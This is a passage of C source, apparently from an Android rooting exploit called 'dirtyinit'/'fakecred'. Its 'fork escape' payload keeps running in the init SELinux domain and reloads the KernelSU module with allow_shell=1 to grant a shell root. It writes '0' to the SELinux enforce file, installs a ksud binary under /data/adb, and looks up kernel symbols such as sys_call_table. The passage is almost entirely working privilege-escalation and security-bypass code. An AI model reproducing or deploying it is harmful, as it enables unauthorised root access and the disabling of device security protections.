        ssize_t r = read(fd, g_modbuf + got, (size_t)(sz - got));
        if (r <= 0) break;
        got += r;
    }
    close(fd);
    g_modlen = (int)got;
    dprintf(1, "[F] module %s 预读完成 %ld/%lld bytes\n", g_modpath,
            (long)got, (long long)sz);
}

/* ---- 方案二诊断：probe 孵化 4 个测试子进程（T0 对照 / T1 delete_module /
 * T2 垃圾 init_module / T3 真模块），每条路径把进度编码进 comm。
 * 父进程在 shell 域扫 /proc 拿到 comm + state + exit_code（僵尸也保留），
 * 一发就能区分「没被秒杀只是报错」和「死在 syscall 里」。 ---- */
static void fc_diag_stage(const char *s) { prctl(PR_SET_NAME, s, 0, 0, 0); }

static void fc_diag_child(int idx)
{
    char nm[16];
    long rc;

    switch (idx) {
    case 0:  /* 对照：只睡，不碰任何模块 syscall */
        fc_diag_stage("T0_START");
        for (int i = 0; i < 500; i++) usleep(10000);
        fc_diag_stage("T0_ALIVE");
        break;
    case 1:  /* delete_module：模块 syscall 入口最小测试（预期 -ENOENT=-2） */
        fc_diag_stage("T1_CALL");
        errno = 0;
        rc = syscall(SYS_delete_module, "nosuchmodx", 0);
        snprintf(nm, sizeof nm, "T1_R%ld", rc);
        fc_diag_stage(nm);
        break;
    case 2: { /* init_module 垃圾 buffer：不进入签名/重定位路径（预期 -ENOEXEC=-8） */
        static unsigned char junk[64];
        fc_diag_stage("T2_CALL");
        errno = 0;
        rc = syscall(SYS_init_module, junk, (unsigned long)sizeof junk, "");
        snprintf(nm, sizeof nm, "T2_R%ld", rc);
        fc_diag_stage(nm);
        break; }
    default: /* 真模块 */
        fc_diag_stage("T3_CALL");
        errno = 0;
        rc = syscall(SYS_init_module, g_modbuf, (unsigned long)g_modlen, "allow_shell=1");
        snprintf(nm, sizeof nm, "T3_R%ld", rc);
        fc_diag_stage(nm);
        break;
    }
    for (;;) pause();
}

/* ---- 阶梯探测：唤醒后逐级加重 syscall，哪一级死就停在那一级的 comm 上 ---- */
static void fc_ladder(void)
{
    char nm[16];
    volatile unsigned long spin = 0;
    int fd;
    long rc;

    fc_diag_stage("S0_SPIN");            /* 纯用户态自旋：不做任何 syscall */
    for (unsigned long i = 0; i < 500000000UL; i++) spin += i;

    /* 逐级二分文件系统 syscall：哪一级死就停在哪一级 */
    fc_diag_stage("S1_DEVNULL");
    fd = open("/dev/null", O_RDONLY);
    if (fd >= 0) close(fd);
    snprintf(nm, sizeof nm, "S1_D%d", fd);
    fc_diag_stage(nm);

    fc_diag_stage("S2_PROCSTAT");
    fd = open("/proc/self/stat", O_RDONLY);
    if (fd >= 0) close(fd);
    snprintf(nm, sizeof nm, "S2_P%d", fd);
    fc_diag_stage(nm);

    fc_diag_stage("S3_STAT");
    {
        struct stat sb;
        rc = stat("/data/misc/kk.ko", &sb);
        snprintf(nm, sizeof nm, "S3_S%ld", rc);
        fc_diag_stage(nm);
    }

    fc_diag_stage("S4_OPENR");           /* 只读打开 /data/misc 下已存在文件 */
    fd = open("/data/misc/fcw_test", O_RDONLY);
    if (fd >= 0) close(fd);
    snprintf(nm, sizeof nm, "S4_O%d", fd);
    fc_diag_stage(nm);

    fc_diag_stage("S5_CREATE");          /* 新建小文件（4 字节） */
    rc = -1;
    fd = open("/data/misc/fcw3", O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd >= 0) {
        rc = (long)write(fd, "ABCD", 4);
        close(fd);
    }
    snprintf(nm, sizeof nm, "S5_W%ld", rc);
    fc_diag_stage(nm);

    fc_diag_stage("S6_COPY");            /* 整模块写入 /data/misc */
    {
        long wrc = -1;
        int cf = open("/data/misc/kk.ko", O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (cf >= 0) {
            ssize_t off = 0;
            while (off < (ssize_t)g_modlen) {
                ssize_t w = write(cf, g_modbuf + off, (size_t)(g_modlen - off));
                if (w <= 0) break;
                off += w;
            }
            wrc = (long)off;
            close(cf);
        }
        snprintf(nm, sizeof nm, "S6_W%ld", wrc);
        fc_diag_stage(nm);
    }

    fc_diag_stage("S7_FINIT");           /* finit_module(fd) */
    {
        long frc = -1;
        int mf = open("/data/misc/kk.ko", O_RDONLY);
        if (mf >= 0) {
            frc = syscall(SYS_finit_module, mf, "", 0);
            close(mf);
        }
        snprintf(nm, sizeof nm, "S7_R%ld", frc);
        fc_diag_stage(nm);
    }

    fc_diag_stage("S8_DONE");
    for (;;) pause();
}

/* ---- 父进程侧：轮询 probe 的所有子进程，打印 comm/state/exit_code 变化 ---- */
static int fc_diag_watch(int probe_pid, int secs)
{
    long long t0 = now_us();
    static int  pid[32], lastst[32];
    static char lastnm[32][20];
    int np = 0;

    for (int tick = 0; tick < secs * 10; tick++) {
        DIR *d = opendir("/proc");
        if (!d) { usleep(100000); continue; }
        struct dirent *de;
        while ((de = readdir(d)) != NULL) {
            if (de->d_name[0] < '0' || de->d_name[0] > '9') continue;
            int p = atoi(de->d_name), pp = -1;
            char nm[32], st = '?';
            long ec = -1;
            fc_stat_line(p, nm, sizeof nm, &st, &pp, &ec);
            int is_probe = (p == probe_pid);
            int is_kid   = (pp == probe_pid);
            if (!is_probe && !is_kid) continue;
            /* 子进程只认本家阶梯 comm（S 或 T 开头+数字）；probe 自己任何 comm 都要看 */
            if (!is_probe && !((nm[0] == 'S' || nm[0] == 'T') && nm[1] >= '0' && nm[1] <= '9')) continue;
            int k = -1;
            for (int i = 0; i < np; i++) if (pid[i] == p) { k = i; break; }
            if (k < 0) {
                if (np >= 32) continue;
                k = np++; pid[k] = p; lastst[k] = -1;
                snprintf(lastnm[k], sizeof lastnm[k], "%s", "?");
            }
            if (lastst[k] != st || strcmp(lastnm[k], nm)) {
                snprintf(lastnm[k], sizeof lastnm[k], "%s", nm);
                lastst[k] = st;
                printf("[F] +%lldms pid=%d comm='%s' state=%c%s",
                       (now_us() - t0) / 1000, p, nm, st,
                       st == 'Z' ? " (已死)" : "");
                if (st == 'Z') printf(" exit_code=%ld", ec);
                printf("\n");
                fflush(stdout);
            }
        }
        closedir(d);
        usleep(100000);
    }
    return np;
}

/* 读 /dev/kmsg 的尾部记录，只保留模块加载相关关键字，写到 fd。
 * 只读；打开/读取失败仅打印 errno，不影响后续驻留。 */
static void kmsg_dump_tail(int fd, int keep)
{
    int kf = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
    if (kf < 0) {
        dprintf(fd, "[K] /dev/kmsg open errno=%d(%s)\n", errno, strerror(errno));
        return;
    }
    static char rec[4096];
    static char out[8192];
    if (keep > (int)sizeof out) keep = (int)sizeof out;
    int olen = 0, recs = 0, mrec = 0;
    ssize_t r;
    while ((r = read(kf, rec, sizeof rec - 1)) > 0) {
        recs++;
        if (recs > 20000) break;                 /* 防御：不在环里打转 */
        if (!(strstr(rec, "module") || strstr(rec, "Module") ||
              strstr(rec, "kernelsu") || strstr(rec, "KernelSU") ||
              strstr(rec, "symbol") || strstr(rec, "vermagic") ||
              strstr(rec, "version") || strstr(rec, "reloc") ||
              strstr(rec, "KSU") || strstr(rec, "[KKP]")))
            continue;
        mrec++;
        int n = (int)r;
        if (n > keep) { memmove(rec, rec + n - keep, (size_t)keep); n = keep; }
        if (olen + n > keep) {
            int drop = olen + n - keep;
            memmove(out, out + drop, (size_t)(olen - drop));
            olen -= drop;
        }
        memcpy(out + olen, rec, (size_t)n);
        olen += n;
    }
    close(kf);
    dprintf(fd, "[K] ---- kmsg tail: recs=%d matched=%d bytes=%d ----\n", recs, mrec, olen);
    if (olen > 0) { if (write(fd, out, (size_t)olen) < 0) {} }
    dprintf(fd, "[K] ---- end kmsg ----\n");
}

/* 从 probe 自身看模块是否真的进了内核（不受 shell 侧 /proc 权限影响）。 */
static void module_state_probe(int fd)
{
    int mf = open("/proc/modules", O_RDONLY);
    if (mf >= 0) {
        char mb[2048]; ssize_t mn;
        dprintf(fd, "[K] /proc/modules:\n");
        while ((mn = read(mf, mb, sizeof mb)) > 0) {
            if (write(fd, mb, (size_t)mn) < 0) {}
        }
        close(mf);
        dprintf(fd, "\n[K] /proc/modules end\n");
    } else {
        dprintf(fd, "[K] /proc/modules open errno=%d(%s)\n", errno, strerror(errno));
    }
    dprintf(fd, "[K] /sys/module/kernelsu=%s\n",
            access("/sys/module/kernelsu", F_OK) == 0 ? "EXISTS" : "MISSING");
    dprintf(fd, "[K] /dev/kernelsu=%s\n",
            access("/dev/kernelsu", F_OK) == 0 ? "EXISTS" : "MISSING");
}

/* ==== fork 逃逸 payload（子进程内执行，不 exec，常驻 init 域）====
 * 绕开 dexec 的 SELinux entrypoint 校验：fork 后域不变（仍是 init），
 * 直接在进程内做取证/文件访问。输出优先 /data/misc/perfetto-traces（init 可写），
 * 回读用 relay: ./dirtyinit cat <file>。 */
static void fc_fork_escape(void)
{
    char path[128] = "", ctx[160] = "", buf[4096];
    const char *outs[4] = {
        "/dev/fc_fork.txt",
        "/data/misc/perfetto-traces/fc_fork.txt",
        "/data/adb/fc_fork.txt",
        "/data/local/tmp/fc_fork.txt"
    };
    int errs[4] = { 0, 0, 0, 0 };
    int of = -1;

    signal(SIGPIPE, SIG_IGN);
    prctl(PR_SET_NAME, "FC_ESCAPE", 0, 0, 0);
    for (int i = 0; i < 4; i++) {
        of = open(outs[i], O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (of >= 0) { snprintf(path, sizeof path, "%s", outs[i]); break; }
        errs[i] = errno;
    }
    /* 低带宽诊断通道：comm 编码 4 个 open 的 errno；shell 侧读 /proc/<pid>/comm 即可 */
    {
        char nm[16];
        snprintf(nm, sizeof nm, "FE_%02x%02x%02x%02x",
                 errs[0] & 0xff, errs[1] & 0xff, errs[2] & 0xff, errs[3] & 0xff);
        prctl(PR_SET_NAME, nm, 0, 0, 0);
    }
#define FO(...) do { if (of >= 0) dprintf(of, __VA_ARGS__); dprintf(1, __VA_ARGS__); } while (0)

    /* ---- -U RELOAD：unload 旧 kernelsu 实例，再以 allow_shell=1 重载 ----
     * allow_shell 是 module_param(perm=0)，无 sysfs 节点，只能加载时传参；
     * uid 2000 只有它为真才能过 allowlist，进而命中 execve("/system/bin/su")。 */
    if (g_reload) {
        int fd, e2, tries;
        long r1 = -1, r2 = -1;
        usleep(800000);   /* 先让父进程的 init_module 撞上 EEXIST，避免与卸载竞态 */
        for (tries = 0; tries < 3; tries++) {
            errno = 0;
            r1 = syscall(106, "kernelsu", 0x800);   /* __NR_delete_module, O_NONBLOCK */
            FO("[RL%d] delete_module ret=%ld errno=%d(%s)\n",
               tries, r1, errno, strerror(errno));
            if (r1 != 0) break;
            usleep(300000);
            errno = 0;
            fd = open("/data/local/tmp/kk34.ko", O_RDONLY);
            FO("[RL%d] open ko fd=%d errno=%d(%s)\n", tries, fd, errno, strerror(errno));
            if (fd < 0) break;
            e2 = 0;
            r2 = syscall(273, fd, "allow_shell=1", 0);  /* __NR_finit_module */
            e2 = errno;
            close(fd);
            FO("[RL%d] finit_module ret=%ld errno=%d(%s)\n",
               tries, r2, e2, e2 ? strerror(e2) : "ok");
            if (r2 == 0) break;
            if (e2 != 17) break;   /* 非 EEXIST 不再重试 */
            usleep(300000);
        }
        usleep(300000);
        {
            char mb[4096]; int mf = open("/proc/modules", O_RDONLY);
            int mn = mf >= 0 ? (int)read(mf, mb, sizeof mb - 1) : -1;
            int me = errno;
            if (mf >= 0) close(mf);
            if (mn > 0) {
                char *p;
                mb[mn] = 0;
                p = strstr(mb, "kernelsu");
                FO("[RL] modules: %s\n", p ? p : "(no kernelsu)");
            } else {
                FO("[RL] read /proc/modules fail errno=%d\n", me);
            }
        }
    }

    /* ---- 关键取证：kmsg 环只有约 8 秒历史（实测 ~262 条/秒）。
     * 模块 init 的 KSU G-OK/G-BAD 只在加载瞬间出现，必须边加载边抓。
     * klogctl(SYSLOG_ACTION_READ_ALL) 一次取整环，100ms 轮询 60s。 ---- */
    {
        long KB = 1 << 20;
        char *kb = (char *)malloc((size_t)KB);
        long long tb = 0; int polls = 0, hits = 0, kerr = 0;
        char last[16][256]; int nl = 0;
        if (!kb) FO("[KM] malloc(%ld) 失败\n", KB);
        for (int loop = 0; kb && loop < 600; loop++) {
            long n = syscall(116, 3, kb, KB);   /* __NR_syslog / SYSLOG_ACTION_READ_ALL */
            int se = errno;
            if (n <= 0) {
                if (!kerr) kerr = se;
                polls++; usleep(100000); continue;
            }
            tb += n; polls++;
            long i = 0;
            while (i < n) {
                long j = i;
                while (j < n && kb[j] != '\n') j++;
                char sv = (j < n) ? kb[j] : 0;
                kb[j < n ? j : n] = 0;
                char *ln = kb + i;
                if (strstr(ln, "KSU") || strstr(ln, "G-OK") || strstr(ln, "G-BAD") ||
                    strstr(ln, "init_module") || strstr(ln, "vermagic") ||
                    strstr(ln, "shell is allowed") || strstr(ln, "syscall hook") ||
                    strstr(ln, "Unknown symbol")) {
                    int dup = 0;
                    for (int q = 0; q < nl; q++) if (!strncmp(last[q], ln, 255)) { dup = 1; break; }
                    if (!dup) {
                        FO("[KM] %s\n", ln);
                        hits++;
                        if (nl < 16) { snprintf(last[nl], 256, "%s", ln); nl++; }
                        else { memmove(last[0], last[1], 15 * 256); snprintf(last[15], 256, "%s", ln); }
                    }
                }
                kb[j < n ? j : n] = sv;
                i = j + 1;
            }
            usleep(100000);
        }
        FO("[KM] klogctl polls=%d bytes=%lld hits=%d first_errno=%d(%s)\n",
           polls, tb, hits, kerr, kerr ? strerror(kerr) : "ok");
        free(kb);
    }

    FO("[FF] escape pid=%d ppid=%d uid=%d euid=%d gid=%d out=%s errs=%02x,%02x,%02x,%02x\n",
       (int)getpid(), (int)getppid(), (int)getuid(), (int)geteuid(), (int)getgid(),
       of >= 0 ? path : "(open failed)",
       errs[0] & 0xff, errs[1] & 0xff, errs[2] & 0xff, errs[3] & 0xff);

    /* ---- 身份：SELinux 域 / uid / caps ---- */
    {
        int fd = open("/proc/self/attr/current", O_RDONLY);
        int n = fd >= 0 ? (int)read(fd, ctx, sizeof ctx - 1) : -1;
        if (fd >= 0) close(fd);
        if (n > 0) {
            ctx[n] = 0;
            char *nl = strchr(ctx, '\n'); if (nl) *nl = 0;
            FO("[FF] ctx='%s'\n", ctx);
        } else {
            FO("[FF] attr/current read=%d errno=%d(%s)\n", n, errno, strerror(errno));
            snprintf(ctx, sizeof ctx, "?");
        }
    }
    {
        int fd = open("/proc/self/status", O_RDONLY);
        int n = fd >= 0 ? (int)read(fd, buf, sizeof buf - 1) : -1;
        if (fd >= 0) close(fd);
        if (n > 0) {
            buf[n] = 0;
            const char *keys[] = { "Uid:", "Gid:", "CapEff:" };
            for (int k = 0; k < 3; k++) {
                char *q = strstr(buf, keys[k]);
                if (!q) continue;
                char *e = strchr(q, '\n'); if (e) *e = 0;
                FO("[FF] %s\n", q);
            }
        } else {
            FO("[FF] /proc/self/status n=%d errno=%d(%s)\n", n, errno, strerror(errno));
        }
    }

    /* ---- 模块状态 ---- */
    {
        int fd = open("/proc/modules", O_RDONLY);
        int n = fd >= 0 ? (int)read(fd, buf, sizeof buf - 1) : -1;
        if (fd >= 0) close(fd);
        if (n > 0) {
            buf[n] = 0;
            char *p = strstr(buf, "kernelsu");
            if (p) {
                char *e = strchr(p, '\n'); if (e) *e = 0;
                FO("[FF] /proc/modules: %s\n", p);
            } else FO("[FF] /proc/modules 无 kernelsu\n");
        } else {
            FO("[FF] /proc/modules n=%d errno=%d(%s)\n", n, errno, strerror(errno));
        }
    }
    FO("[FF] /sys/module/kernelsu=%s /dev/kernelsu=%s\n",
       access("/sys/module/kernelsu", F_OK) == 0 ? "EXISTS" : "MISSING",
       access("/dev/kernelsu", F_OK) == 0 ? "EXISTS" : "MISSING");
    {
        struct stat sb;
        if (stat("/dev/kernelsu", &sb) == 0)
            FO("[FF] /dev/kernelsu mode=%o rdev=%llx\n", sb.st_mode & 07777,
               (unsigned long long)sb.st_rdev);
        else
            FO("[FF] stat /dev/kernelsu errno=%d(%s)\n", errno, strerror(errno));
    }

    /* ---- /dev/kmsg 回读（SEEK_SET 0），只保留关键行 ---- */
    {
        int kf = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
        if (kf < 0) {
            FO("[FF] open /dev/kmsg(r) errno=%d(%s)\n", errno, strerror(errno));
        } else {
            off_t sk = lseek(kf, 0, SEEK_SET);
            long long bytes = 0; int total = 0, hit = 0, ll = 0;
            char lb[1024];
            FO("[FF] /dev/kmsg opened seek0=%lld\n", (long long)sk);
            for (;;) {
                ssize_t n = read(kf, buf, sizeof buf);
                if (n <= 0) break;
                bytes += n;
                for (ssize_t i = 0; i < n; i++) {
                    char c = buf[i];
                    if (c == '\n') {
                        lb[ll] = 0; total++;
                        if (strstr(lb, "KSU") || strstr(lb, "ksu") || strstr(lb, "G-OK") ||
                            strstr(lb, "G-BAD") || strstr(lb, "KKP") || strstr(lb, "init_module") ||
                            strstr(lb, "vermagic") || strstr(lb, "Unknown symbol")) {
                            if (of >= 0) dprintf(of, "[KM] %s\n", lb);
                            hit++;
                        }
                        ll = 0;
                    } else if (ll < (int)sizeof lb - 1) {
                        lb[ll++] = c;
                    }
                }
                if (bytes >= (256 << 10)) break;
            }
            FO("[FF] kmsg bytes=%lld lines=%d hit=%d\n", bytes, total, hit);
            close(kf);
        }
    }

    /* ---- SELinux enforce：读 → 写 0 → 回读 ---- */
    {
        int ef = open("/sys/fs/selinux/enforce", O_RDWR);
        if (ef < 0) {
            FO("[FF] open enforce errno=%d(%s)\n", errno, strerror(errno));
        } else {
            char ev[8]; int rn;
            memset(ev, 0, sizeof ev);
            rn = (int)read(ef, ev, 7);
            FO("[FF] enforce before='%s' read=%d\n", rn > 0 ? ev : "?", rn);
            lseek(ef, 0, SEEK_SET);
            errno = 0;
            ssize_t w = write(ef, "0", 1);
            int we = errno;
            FO("[FF] enforce write '0' ret=%zd errno=%d(%s)\n", w, we, strerror(we));
            lseek(ef, 0, SEEK_SET);
            memset(ev, 0, sizeof ev);
            rn = (int)read(ef, ev, 7);
            FO("[FF] enforce after='%s' read=%d\n", rn > 0 ? ev : "?", rn);
            close(ef);
        }
    }

    /* ---- /data/adb 访问 ---- */
    {
        DIR *d = opendir("/data/adb");
        if (!d) {
            FO("[FF] opendir /data/adb errno=%d(%s)\n", errno, strerror(errno));
        } else {
            struct dirent *de; int n = 0;
            FO("[FF] /data/adb entries:\n");
            while ((de = readdir(d)) != NULL && n < 50) {
                FO("[FF]   %s\n", de->d_name);
                n++;
            }
            closedir(d);
            FO("[FF] /data/adb count=%d\n", n);
        }
        const char *probes[3] = { "/data/adb/su", "/data/adb/ksud", "/data/adb/ksu" };
        for (int i = 0; i < 3; i++) {
            struct stat sb;
            errno = 0;
            int r = stat(probes[i], &sb);
            int se = errno;
            if (r == 0)
                FO("[FF] stat %s OK mode=%o size=%lld\n", probes[i],
                   sb.st_mode & 07777, (long long)sb.st_size);
            else
                FO("[FF] stat %s fail errno=%d(%s)\n", probes[i], se, strerror(se));
        }
    }

    /* ---- FCFORKKSU：在本进程内直接落 ksud（不 exec，init 域无 shell_exec）----
     * SHELL: 路线在 init_module 之后 exec /system/bin/sh 会被 SELinux 拒（无
     * init→shell 转换），表现为 probe 卡住、脚本一行不跑。这里改为纯文件操作：
     * mkdir /data/adb/ksu/bin + 复制 ksud330 -> ksud，等价于 ksud install 的关键一步。 */
    if (g_ksuinst) {
        const char *src = "/data/local/tmp/ksud330";
        const char *dsts[2] = { "/data/adb/ksu/bin/ksud", "/data/adb/ksud" };
        FO("[KI] ==== 开始安装 ksud ====\n");
        errno = 0;
        if (mkdir("/data/adb/ksu", 0755) != 0 && errno != EEXIST)
            FO("[KI] mkdir /data/adb/ksu errno=%d(%s)\n", errno, strerror(errno));
        errno = 0;
        if (mkdir("/data/adb/ksu/bin", 0755) != 0 && errno != EEXIST)
            FO("[KI] mkdir /data/adb/ksu/bin errno=%d(%s)\n", errno, strerror(errno));
        errno = 0;
        int sf = open(src, O_RDONLY);
        FO("[KI] open %s fd=%d errno=%d(%s)\n", src, sf, errno, strerror(errno));
        if (sf >= 0) {
            char *cp = (char *)malloc(1 << 16);
            for (int k = 0; k < 2; k++) {
                errno = 0;
                int df = open(dsts[k], O_WRONLY | O_CREAT | O_TRUNC, 0755);
                FO("[KI] open %s fd=%d errno=%d(%s)\n", dsts[k], df, errno, strerror(errno));
                if (df < 0) continue;
                lseek(sf, 0, SEEK_SET);
                long long tot = 0;
                ssize_t r;
                while (cp && (r = read(sf, cp, 1 << 16)) > 0) {
                    ssize_t o = 0;
                    while (o < r) {
                        ssize_t w = write(df, cp + o, (size_t)(r - o));
                        if (w <= 0) break;
                        o += w;
                    }
                    tot += r;
                }
                fchmod(df, 0755);
                fsync(df);
                close(df);
                FO("[KI] wrote %s bytes=%lld\n", dsts[k], tot);
            }
            free(cp);
            close(sf);
        }
        {
            struct stat sb;
            errno = 0;
            if (stat("/data/adb/ksu/bin/ksud", &sb) == 0)
                FO("[KI] stat OK mode=%o size=%lld\n", sb.st_mode & 07777, (long long)sb.st_size);
            else
                FO("[KI] stat fail errno=%d(%s)\n", errno, strerror(errno));
        }
        FO("[KI] ==== ksud 安装结束 ====\n");
    }

    /* ---- kmsg 标记 + 落盘 + 心跳常驻 ---- */
    {
        int kw = open("/dev/kmsg", O_WRONLY | O_NONBLOCK);
        if (kw >= 0) {
            char kb[200];
            int kn = snprintf(kb, sizeof kb,
                              "[FCF] escape pid=%d uid=%d ctx=%s out=%s errs=%02x,%02x,%02x,%02x\n",
                              (int)getpid(), (int)getuid(), ctx, path,
                              errs[0] & 0xff, errs[1] & 0xff, errs[2] & 0xff, errs[3] & 0xff);
            if (kn > 0) { if (write(kw, kb, (size_t)kn) < 0) {} }
            close(kw);
        } else FO("[FF] open /dev/kmsg(w) errno=%d(%s)\n", errno, strerror(errno));
    }
    if (of >= 0) { if (fsync(of) < 0) {} }
    FO("[FF] 进入心跳常驻（不 exec / 不 exit）\n");

    for (int i = 0; ; i++) {
        if (of >= 0 && (i % 30) == 0) dprintf(of, "[FF] alive i=%d\n", i);
        sleep(1);
    }
#undef FO
}

/* 关键内核符号：sys_call_table 写入是否落地、tracepoint 是否存在 */
static const char *g_ksym_keys[] = {
    "sys_call_table", "sys_ni_syscall", "ksu_syscall_dispatcher",
    "ksu_syscall_table", "ksu_dispatcher_nr", "trace_sys_enter",
    "__tracepoint_sys_enter", "syscall_regfunc", "aarch64_insn_patch",
    "text_poke", "set_fixmap",
};

static void dump_kallsyms(int fd)
{
    int kf = open("/proc/kallsyms", O_RDONLY);
    static char buf[1 << 16];
    char line[512];
    int ll = 0, hits = 0;
    ssize_t r;
    if (kf < 0) {
        dprintf(fd, "[ks] open /proc/kallsyms errno=%d(%s)\n", errno, strerror(errno));
        return;
    }
    while ((r = read(kf, buf, sizeof buf)) > 0) {
        ssize_t i;
        for (i = 0; i < r; i++) {
            char c = buf[i];
            if (c == '\n') {
                unsigned k;
                line[ll] = 0;
                for (k = 0; k < sizeof(g_ksym_keys) / sizeof(g_ksym_keys[0]); k++) {
                    if (strstr(line, g_ksym_keys[k])) {
                        dprintf(fd, "[ks] %s\n", line);
                        hits++;
                        break;
                    }
                }
                ll = 0;
            } else if (ll < (int)sizeof(line) - 1) {
                line[ll++] = c;
            }
        }
    }
    close(kf);
    dprintf(fd, "[ks] hits=%d\n", hits);
}

static void probe_dump(void)
{
    static char kb[1 << 20];
    long n = syscall(SYS_syslog, 3, kb, (int)sizeof kb);   /* READ_ALL */
    int e = errno;
    const char *paths[3] = {"/data/misc/perfetto-traces/act_root.txt",
                            "/data/act_root.txt",
                            "/data/local/tmp/act_root.txt"};
    struct stat st;
    int fd = -1, i;

    for (i = 0; i < 3; i++) {
        fd = open(paths[i], O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd >= 0) break;
    }
    if (fd < 0) return;

    dprintf(fd, "uid=%d euid=%d gid=%d syslog_n=%ld errno=%d(%s) path=%s\n",
            (int)getuid(), (int)geteuid(), (int)getgid(), n, e, strerror(e),
            i < 3 ? paths[i] : "?");

    int sf = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (sf >= 0) {
        char b[8] = {0};
        if (read(sf, b, 4) > 0) dprintf(fd, "enforce=%s", b);
        close(sf);
    } else {
        dprintf(fd, "enforce open errno=%d(%s)\n", errno, strerror(errno));
    }

    if (stat("/data/adb", &st) == 0) dprintf(fd, "/data/adb ok mode=%o uid=%d\n",
                                             st.st_mode, (int)st.st_uid);
    else dprintf(fd, "/data/adb stat errno=%d(%s)\n", errno, strerror(errno));
    if (stat("/data/adb/ksud", &st) == 0) dprintf(fd, "/data/adb/ksud ok size=%ld\n",
                                                  (long)st.st_size);
    else dprintf(fd, "/data/adb/ksud stat errno=%d(%s)\n", errno, strerror(errno));

    int mf = open("/proc/modules", O_RDONLY);
    if (mf >= 0) {
        static char mb[8192];
        ssize_t mr = read(mf, mb, sizeof mb - 1);
        if (mr > 0) {
            char *p;
            mb[mr] = 0;
            for (p = mb; p && *p; ) {
                char *nl = strchr(p, '\n');
                if (nl) *nl = 0;
                if (strstr(p, "kernelsu")) dprintf(fd, "[mod] %s\n", p);
                p = nl ? nl + 1 : NULL;
            }
        }
        close(mf);
    } else {
        dprintf(fd, "/proc/modules open errno=%d(%s)\n", errno, strerror(errno));
    }

    dump_kallsyms(fd);
    if (n > 0) { if (write(fd, kb, (size_t)n) < 0) {} }
    close(fd);
}

/* 精简取证：只把 kmsg 里的 KSU 关键行 + 关键符号地址写到 fd1（probe→父的 sel pipe）。
 * 不做任何文件落盘（init 域写不了 shell_data_file/ perfetto），也不整环 1MB 灌管道。 */
static void probe_dump_brief(void)
{
    static char kb[1 << 20];
    static char lb[1 << 20];
    long n;

    dprintf(1, "[D] brief enter uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
    errno = 0;
    n = syscall(SYS_syslog, 3, kb, (int)sizeof kb);
    dprintf(1, "[D] syslog n=%ld errno=%d(%s)\n", n, errno, strerror(errno));
    if (n > 0) {
        long i = 0;
        int shown = 0;
        while (i < n && shown < 300) {
            long j = i;
            while (j < n && kb[j] != '\n') j++;
            char sv = (j < n) ? kb[j] : 0;
            kb[j < n ? j : n] = 0;
            if (strstr(kb + i, "KSU") || strstr(kb + i, "KP1") || strstr(kb + i, "KP2") ||
                strstr(kb + i, "G-OK") || strstr(kb + i, "G-BAD") || strstr(kb + i, "KD1") ||
                strstr(kb + i, "shell is allowed") || strstr(kb + i, "syscall hook")) {
                dprintf(1, "[K] %s\n", kb + i);
                shown++;
            }
            kb[j < n ? j : n] = sv;
            i = j + 1;
        }
        dprintf(1, "[D] kmsg shown=%d\n", shown);
    }
    {
        const char *keys[] = { " sys_call_table", " __arm64_sys_ni_syscall",
                               " ksu_syscall_table_hook", " ksu_syscall_dispatcher",
                               " ksu_patch_text", " __set_fixmap", " text_poke", NULL };
        int kf = open("/proc/kallsyms", O_RDONLY);
        dprintf(1, "[D] kallsyms fd=%d errno=%d(%s)\n", kf, errno, strerror(errno));
        if (kf >= 0) {
            long r = read(kf, lb, sizeof lb - 1);
            close(kf);
            dprintf(1, "[D] kallsyms bytes=%ld\n", r);
            if (r > 0) {
                long p = 0;
                lb[r] = 0;
                while (p < r) {
                    long q = p;
                    int k;
                    while (q < r && lb[q] != '\n') q++;
                    char sv = (q < r) ? lb[q] : 0;
                    lb[q < r ? q : r] = 0;
                    for (k = 0; keys[k]; k++)
                        if (strstr(lb + p, keys[k])) { dprintf(1, "[S] %s\n", lb + p); break; }
                    lb[q < r ? q : r] = sv;
                    p = q + 1;
                }
            }
        }
    }
    dprintf(1, "[D] brief done\n");
}

/* probe 侧自证：不依赖 exec / 不依赖 sel-pipe，直接写文件 + kmsg，带当前 SELinux 域字符串 */
static void probe_selfreport(const char *tag)
{
    char b[640];
    char ctx[256] = "?";
    int n, fd, cf;

    cf = open("/proc/self/attr/current", O_RDONLY);
    if (cf >= 0) {
        int r = read(cf, ctx, sizeof ctx - 1);
        if (r > 0) {
            char *p;
            ctx[r] = 0;
            p = strchr(ctx, '\n');
            if (p) *p = 0;
        }
        close(cf);
    }
    n = snprintf(b, sizeof b, "%s uid=%d euid=%d gid=%d ctx=%s\n",
                 tag, (int)getuid(), (int)geteuid(), (int)getgid(), ctx);
    if (n > 0) {
        fd = open("/data/local/tmp/pr1.txt", O_WRONLY | O_CREAT | O_APPEND, 0666);
        if (fd >= 0) {
            if (write(fd, b, (size_t)n) < 0) {}
            close(fd);
        }
        /* 第二落点：init 域可读写、shell 域可写（/data/local/tmp 被域策略拒时仍有证据） */
        fd = open("/data/misc/perfetto-traces/pr1.txt", O_WRONLY | O_CREAT | O_APPEND, 0666);
        if (fd >= 0) {
            if (write(fd, b, (size_t)n) < 0) {}
            close(fd);
        }
        fd = open("/dev/kmsg", O_WRONLY | O_NONBLOCK);
        if (fd >= 0) {
            char kb[672];
            int kn = snprintf(kb, sizeof kb, "[PRB] %s", b);
            if (kn > 0) { if (write(fd, kb, (size_t)kn) < 0) {} }
            close(fd);
        }
        dprintf(1, "[PRB] %s", b);
        fflush(stdout);
    }
}

static void tm_log(const char *fmt, ...)
{
    int fd = open("/sys/kernel/tracing/trace_marker", O_WRONLY);
    va_list ap;
    if (fd < 0) return;
    va_start(ap, fmt);
    vdprintf(fd, fmt, ap);
    va_end(ap);
    close(fd);
}

static void fakecred_run(void)
{
    char nm[16];
    long rc = -2;
    int e = 0;

    /* 进程可能在本轮被外部秒杀，pipe 输出未必来得及被父进程读走，
     * 因此把执行进度/结果写进 comm —— zombie 也保留 comm，父进程轮询 /proc/<pid>/stat 就能看到 */
    prctl(PR_SET_NAME, "FC_WAKE", 0, 0, 0);
    tm_log("KK enter fakecred_run uid=%d\n", (int)getuid());
    dprintf(1, "[F] 已被放行，开始 init_module 流程\n");
    probe_selfreport("P0");
